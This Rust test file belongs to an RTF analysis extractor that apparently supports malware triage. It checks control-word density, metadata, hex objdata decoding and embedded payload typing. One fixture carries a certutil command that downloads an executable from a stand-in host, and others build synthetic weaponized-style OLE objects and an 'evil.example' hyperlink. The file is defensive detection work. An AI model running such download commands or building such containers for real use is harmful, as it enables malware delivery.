use super::*;

fn extract_rtf(bytes: &[u8]) -> (Values, Metrics) {
    let mut v = Values::new();
    let mut s = Strings::default();
    let mut m = Metrics::new();
    extract(bytes, &mut v, &mut s, &mut m);
    (v, m)
}

#[test]
fn control_word_density_separates_a_document_from_a_wrapper() {
    // A document is mostly formatting, so it carries tens of control
    // words per kilobyte whatever its size. A file that opens with
    // `{\rtf` and then spends its bytes on a payload sits far below
    // that, and the ratio says so without knowing what the payload is.
    let mut doc = b"{\\rtf1\\ansi\\deff0{\\fonttbl{\\f0\\fnil Arial;}}".to_vec();
    for _ in 0..60 {
        doc.extend_from_slice(b"\\pard\\f0\\fs20 Some ordinary text.\\par\n");
    }
    doc.push(b'}');
    let (_, m) = extract_rtf(&doc);
    let dense = m.get("rtf.control_word_density").unwrap();
    assert!(dense > 20.0, "document density {dense}");

    // Same header, then a megabyte of hex with nothing to format.
    let mut wrapper = b"{\\rtf1{\\object\\objdata ".to_vec();
    wrapper.extend(std::iter::repeat_n(b'a', 200_000));
    wrapper.extend_from_slice(b"}}");
    let (_, m2) = extract_rtf(&wrapper);
    let sparse = m2.get("rtf.control_word_density").unwrap();
    assert!(sparse < 1.0, "wrapper density {sparse}");
    assert!(dense > sparse * 20.0, "{dense} vs {sparse}");

    // A NUL where the version digit belongs, then a run of `\` + letter
    // that is not a control word. The delimiter keeps those out of the
    // count, so the body still reads as a payload.
    let mut broken = b"{\\rtf\x00".to_vec();
    for _ in 0..8_000 {
        broken.extend_from_slice(b"\\A\xff");
    }
    let (_, m3) = extract_rtf(&broken);
    let broken_density = m3.get("rtf.control_word_density").unwrap();
    assert!(
        broken_density < 10.0,
        "broken-header density {broken_density}"
    );
}

#[test]
fn control_word_density_is_absent_for_non_rtf() {
    // The extractor bails before the shape pass when the magic is
    // missing, so nothing downstream sees a density of zero.
    let (_, m) = extract_rtf(b"not an rtf document at all");
    assert_eq!(m.get("rtf.control_word_density"), None);
}

#[test]
fn parses_header_fields() {
    let rtf = b"{\\rtf1\\ansi\\ansicpg1252\\deflang1033 ...}";
    let (v, _) = extract_rtf(rtf);
    assert_eq!(v.get("rtf.version").and_then(|x| x.as_str()), Some("1"));
    assert_eq!(v.get("rtf.charset").and_then(|x| x.as_str()), Some("ansi"));
    assert_eq!(v.get("rtf.codepage").and_then(|x| x.as_str()), Some("1252"));
    assert_eq!(v.get("rtf.deflang").and_then(|x| x.as_str()), Some("1033"));
}

#[test]
fn extracts_info_author() {
    let rtf = b"{\\rtf1\\ansi {\\info{\\author Alice}{\\title Hello}{\\company Acme}}}";
    let (v, _) = extract_rtf(rtf);
    assert_eq!(
        v.get("rtf.info.author").and_then(|x| x.as_str()),
        Some("Alice")
    );
    assert_eq!(
        v.get("rtf.info.title").and_then(|x| x.as_str()),
        Some("Hello")
    );
    assert_eq!(
        v.get("rtf.info.company").and_then(|x| x.as_str()),
        Some("Acme")
    );
}

#[test]
fn extracts_creatim_raw() {
    let rtf = b"{\\rtf1\\ansi {\\info{\\creatim\\yr2024\\mo1\\dy15\\hr12\\min30}}}";
    let (v, _) = extract_rtf(rtf);
    let creatim = v.get("rtf.info.creatim").and_then(|x| x.as_str()).unwrap();
    assert!(creatim.contains("yr2024"));
}

#[test]
fn extracts_field_kind_and_target() {
    let rtf =
        b"{\\rtf1\\ansi {\\field {\\*\\fldinst HYPERLINK \"https://evil.example/\" }{\\fldrslt }}}";
    let (v, _) = extract_rtf(rtf);
    let fields = v.get("rtf.fields").and_then(|x| x.as_array()).unwrap();
    assert_eq!(fields.len(), 1);
    assert_eq!(fields[0]["kind"].as_str(), Some("HYPERLINK"));
    assert_eq!(fields[0]["target"].as_str(), Some("https://evil.example/"));
}

#[test]
fn parses_obfuscated_rtf_object_structure_after_malformed_header() {
    let sample = zstd::decode_all(
        &include_bytes!("../../../tests/fixtures/rtf/obfuscated-object.sample.zst")[..],
    )
    .expect("fixture decompresses");
    let (values, metrics) = extract_rtf(&sample);
    let features = values
        .get("rtf.features")
        .and_then(|v| v.as_array())
        .unwrap();
    assert!(features.iter().any(|v| v.as_str() == Some("object")));
    assert!(features.iter().any(|v| v.as_str() == Some("objdata")));
    assert_eq!(metrics.get("rtf.objdata_count"), Some(2.0));
}

#[test]
fn extracts_object_class() {
    let rtf = b"{\\rtf1\\ansi {\\object\\objemb{\\*\\objclass Equation.3 }{\\objdata }}}";
    let (v, _) = extract_rtf(rtf);
    let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
    assert_eq!(objects.len(), 1);
    assert_eq!(objects[0]["class"].as_str(), Some("Equation.3"));
}

/// Build an OLE1.0 embedded-object blob and write it out as the hex a
/// real document carries, wrapped at eighty columns the way writers do.
fn objdata_rtf(class: &str, native: &[u8]) -> Vec<u8> {
    let mut blob = Vec::new();
    blob.extend_from_slice(&0x0105_u32.to_le_bytes());
    blob.extend_from_slice(&2u32.to_le_bytes());
    blob.extend_from_slice(&((class.len() + 1) as u32).to_le_bytes());
    blob.extend_from_slice(class.as_bytes());
    blob.push(0);
    blob.extend_from_slice(&0u32.to_le_bytes());
    blob.extend_from_slice(&0u32.to_le_bytes());
    blob.extend_from_slice(&(native.len() as u32).to_le_bytes());
    blob.extend_from_slice(native);

    let mut hex = String::new();
    for (i, b) in blob.iter().enumerate() {
        if i > 0 && i % 40 == 0 {
            hex.push_str("\r\n");
        }
        hex.push_str(&format!("{b:02x}"));
    }
    format!("{{\\rtf1\\ansi{{\\object\\objocx{{\\*\\objdata {hex}}}}}}}").into_bytes()
}

#[test]
fn reads_the_class_out_of_a_hex_objdata_blob() {
    // The shape that matters: no plaintext \objclass anywhere, which is
    // how weaponized RTF is written.
    let rtf = objdata_rtf("MSComctlLib.Toolbar.2", &[0u8; 16]);
    assert!(!String::from_utf8_lossy(&rtf).contains("objclass"));
    let (v, m) = extract_rtf(&rtf);
    let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
    assert_eq!(objects[0]["class"].as_str(), Some("MSComctlLib.Toolbar.2"));
    assert_eq!(objects[0]["source"].as_str(), Some("objdata"));
    assert_eq!(m.get("rtf.objdata_count"), Some(1.0));
}

#[test]
fn names_what_the_native_payload_is() {
    let cfb = objdata_rtf("Package", &[0xd0, 0xcf, 0x11, 0xe0, 0xa1, 0xb1, 0x1a, 0xe1]);
    let (v, _) = extract_rtf(&cfb);
    let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
    assert_eq!(objects[0]["native"].as_str(), Some("cfb"));

    let mut pe = vec![0u8; 0x80];
    pe[0] = b'M';
    pe[1] = b'Z';
    pe[0x3c..0x40].copy_from_slice(&0x40u32.to_le_bytes());
    pe[0x40..0x44].copy_from_slice(b"PE\0\0");
    let (v, _) = extract_rtf(&objdata_rtf("Package", &pe));
    let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
    assert_eq!(objects[0]["native"].as_str(), Some("pe"));
}

#[test]
fn a_blob_that_is_not_an_ole_header_yields_no_class() {
    // Random hex must not be read as a header: a length field taken out
    // of noise would invent a class name.
    let mut rtf = b"{\\rtf1{\\object{\\*\\objdata ".to_vec();
    rtf.extend(std::iter::repeat_n(b'f', 400));
    rtf.extend_from_slice(b"}}}");
    let (v, m) = extract_rtf(&rtf);
    assert!(v.get("rtf.objects").is_none());
    // The blob is still counted -- its presence is a fact even when its
    // contents are not a header we recognize.
    assert_eq!(m.get("rtf.objdata_count"), Some(1.0));
}

#[test]
fn a_plaintext_objclass_still_wins_its_own_entry() {
    let rtf = b"{\\rtf1\\ansi {\\object\\objemb{\\*\\objclass Equation.3 }{\\objdata }}}";
    let (v, _) = extract_rtf(rtf);
    let objects = v.get("rtf.objects").and_then(|x| x.as_array()).unwrap();
    assert_eq!(objects.len(), 1);
    assert_eq!(objects[0]["class"].as_str(), Some("Equation.3"));
}

#[test]
fn decoded_objdata_text_is_added_to_the_file_s_own_strings() {
    // extract_binary_strings *replaces* strings.text, so the decoded blob
    // has to be appended to the file's own strings, not extracted through
    // it a second time.
    let command = b"cmd /c certutil -urlcache -f http://example.test/a.exe";
    let rtf = objdata_rtf("Package", command);
    let (_, _) = extract_rtf(&rtf);

    let mut values = Values::default();
    let mut strings = Strings::default();
    let mut metrics = Metrics::default();
    extract(&rtf, &mut values, &mut strings, &mut metrics);
    let all: Vec<&str> = strings
        .text
        .rows()
        .iter()
        .map(|r| r.value.as_str())
        .collect();
    // The decoded command, which appears nowhere in the file's bytes.
    assert!(
        all.iter().any(|v| v.contains("certutil")),
        "decoded objdata text missing: {all:?}"
    );
    // And the document's own text.
    assert!(
        all.iter().any(|v| v.contains("objdata")),
        "file's own strings were discarded: {all:?}"
    );
}

#[test]
fn features_include_object_and_field() {
    let rtf = b"{\\rtf1\\ansi {\\object\\objemb}{\\field foo}}";
    let (v, _) = extract_rtf(rtf);
    let feats = v.get("rtf.features").and_then(|x| x.as_array()).unwrap();
    let names: Vec<&str> = feats.iter().filter_map(|x| x.as_str()).collect();
    assert!(names.contains(&"object"));
    assert!(names.contains(&"objemb"));
    assert!(names.contains(&"field"));
}

#[test]
fn shape_counts_braces_and_control_words() {
    let rtf = b"{\\rtf1\\ansi {\\info{\\author X}}}";
    let (v, m) = extract_rtf(rtf);
    let shape = v.get("rtf.shape").and_then(|x| x.as_object()).unwrap();
    assert!(shape.get("brace_count").and_then(|x| x.as_u64()).unwrap() >= 4);
    assert!(
        shape
            .get("group_depth_max")
            .and_then(|x| x.as_u64())
            .unwrap()
            >= 2
    );
    assert!(m.get("rtf.control_word_count").unwrap() > 0.0);
}

#[test]
fn no_magic_is_silent() {
    let (v, _) = extract_rtf(b"not an rtf");
    assert!(v.get("rtf.version").is_none());
}

#[test]
fn unterminated_group_doesnt_crash() {
    // Opening brace + magic but no matching close — match_group_end
    // returns bytes.len() so we should still parse the prefix without
    // panic.
    let (v, _) = extract_rtf(b"{\\rtf1\\ansi {\\info{\\author Mallory");
    assert_eq!(v.get("rtf.version").and_then(|x| x.as_str()), Some("1"));
}

#[test]
fn empty_input_is_silent() {
    let (v, _) = extract_rtf(b"");
    assert!(v.get("rtf.version").is_none());
}

#[test]
fn escaped_braces_dont_unbalance_depth() {
    // `\{` and `\}` are escaped — they should not change brace depth.
    let rtf = b"{\\rtf1\\ansi {\\info{\\author A\\{B\\}C}}}";
    let (v, _) = extract_rtf(rtf);
    // Backslash-escaped braces are decoded as literal `{` and `}`.
    assert_eq!(
        v.get("rtf.info.author").and_then(|x| x.as_str()),
        Some("A{B}C")
    );
}
